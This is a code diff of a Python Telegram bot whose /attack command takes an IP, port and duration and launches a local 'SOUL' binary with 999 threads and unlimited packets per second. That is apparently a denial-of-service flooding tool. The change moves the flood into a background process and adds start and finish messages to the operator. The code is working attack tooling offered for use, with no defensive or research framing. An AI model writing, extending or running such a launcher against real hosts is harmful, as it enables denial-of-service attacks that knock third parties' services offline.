@@ -1,19 +1,17 @@
 import os
 import subprocess
+import asyncio
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 import config  # BOT_TOKEN and USER_ID
 
-# Authorized user list
 AUTHORIZED_USERS = [str(config.USER_ID)]
-
-# Maximum SOUL settings
 MAX_THREADS = "999"
 MAX_PPS = "-1"  # unlimited packets per second
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "⚡ Welcome! Use /attack <IP> <PORT> <DURATION> to run SOUL with max threads and PPS."
+        "⚡ Welcome! Use /attack <IP> <PORT> <DURATION> to start SOUL attacks."
     )
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -28,39 +26,31 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     ip, port, duration = args
-
     try:
-        # Make SOUL executable
         os.chmod("./SOUL", 0o755)
 
-        # Run SOUL binary
-        result = subprocess.run(
-            ["./SOUL", ip, str(port), str(duration), MAX_THREADS, MAX_PPS],
-            capture_output=True,
-            text=True
+        # Notify attack start
+        await update.message.reply_text(
+            f"⚡ Attack started on {ip}:{port} for {duration} seconds."
         )
 
-        output = result.stdout
-        error = result.stderr
+        # Run SOUL in background
+        process = await asyncio.create_subprocess_exec(
+            "./SOUL", ip, str(port), str(duration), MAX_THREADS, MAX_PPS,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
 
-        # Telegram has message limits, so send as file if too long
-        combined_output = f"Output:\n{output}\n\nError:\n{error}"
-        if len(combined_output) > 3500:  # keep buffer for caption
-            filename = "attack_output.txt"
-            with open(filename, "w") as f:
-                f.write(combined_output)
+        # Wait for the attack to finish
+        await process.wait()
 
-            await update.message.reply_document(
-                document=open(filename, "rb"),
-                filename=filename,
-                caption="✅ SOUL attack executed. Full output attached."
-            )
-            os.remove(filename)
-        else:
-            await update.message.reply_text(combined_output or "✅ Attack executed with no output.")
+        # Notify attack end
+        await update.message.reply_text(
+            f"✅ Attack on {ip}:{port} for {duration} seconds completed."
+        )
 
     except Exception as e:
-        await update.message.reply_text(f"❌ Failed to run SOUL: {str(e)}")
+        await update.message.reply_text(f"❌ Failed to start attack: {str(e)}")
 
 if __name__ == "__main__":
     app = ApplicationBuilder().token(config.BOT_TOKEN).build()
